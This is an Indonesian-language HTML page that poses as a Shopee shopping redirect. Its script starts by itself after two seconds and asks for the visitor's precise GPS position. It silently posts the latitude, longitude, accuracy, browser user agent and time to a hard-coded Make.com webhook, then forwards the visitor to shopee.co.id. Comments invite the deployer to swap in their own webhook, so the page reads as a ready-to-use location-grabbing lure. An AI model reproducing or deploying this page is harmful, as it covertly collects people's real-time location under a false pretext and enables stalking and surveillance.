<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect ke Shopee</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #ff5311 0%, #ff0000 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; border-radius: 20px; padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); max-width: 500px; width: 100%; text-align: center; }
        .logo { font-size: 4em; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 15px; font-size: 2em; }
        .btn { background: linear-gradient(135deg, #ff5311 0%, #ff0000 100%); color: white; border: none; padding: 18px 40px; border-radius: 50px; font-size: 1.3em; font-weight: bold; cursor: pointer; margin: 20px 0; transition: transform 0.3s; width: 100%; }
        .btn:hover { transform: translateY(-3px); }
        .loading { color: #ff5311; font-size: 1.2em; margin: 20px 0; }
        .success { color: #28a745; }
        .error { color: #dc3545; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üõçÔ∏è</div>
        <h1>Selamat Datang di Shopee</h1>
        <p id="status" class="loading">Mempersiapkan...</p>
        <button class="btn" onclick="redirectToShopee()">Langsung Belanja üöÄ</button>
    </div>

    <script>
        // Auto start dalam 2 detik
        setTimeout(redirectToShopee, 2000);

        async function redirectToShopee() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = 'üîÑ Mendeteksi lokasi...';
            
            if (!navigator.geolocation) {
                statusDiv.innerHTML = '‚ùå Browser tidak support lokasi';
                redirectToShopeeDirect();
                return;
            }
            
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    });
                });
                
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                
                statusDiv.innerHTML = '‚úÖ Lokasi ditemukan!';
                
                // üìß KIRIM KE MAKE.COM WEBHOOK (URL ANDA)
                await sendToMakeWebhook(lat, lng, accuracy);
                
                statusDiv.innerHTML = 'üõçÔ∏è Mengarahkan ke Shopee...';
                
                // Redirect ke Shopee setelah 1 detik
                setTimeout(() => {
                    window.location.href = 'https://shopee.co.id';
                }, 1000);
                
            } catch (error) {
                console.log('GPS Error:', error);
                statusDiv.innerHTML = '‚ö†Ô∏è Redirect tanpa lokasi...';
                redirectToShopeeDirect();
            }
        }
        
        function redirectToShopeeDirect() {
            setTimeout(() => {
                window.location.href = 'https://shopee.co.id';
            }, 2000);
        }
        
        // üìä KIRIM DATA KE MAKE.COM
        async function sendToMakeWebhook(lat, lng, accuracy) {
            // üî• GANTI DENGAN WEBHOOK URL ANDA
            const webhookURL = 'https://hook.eu2.make.com/snsxpo7oc5fyiy3fy697rqu29trp9rqy';
            
            const data = {
                latitude: lat,
                longitude: lng,
                accuracy: accuracy,
                timestamp: new Date().toLocaleString('id-ID'),
                userAgent: navigator.userAgent,
                url: window.location.href
            };
            
            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    console.log('‚úÖ Data terkirim ke Make.com');
                } else {
                    console.log('‚ùå Gagal kirim data');
                }
            } catch (error) {
                console.log('‚ùå Error:', error);
            }
        }
    </script>
</body>
</html>
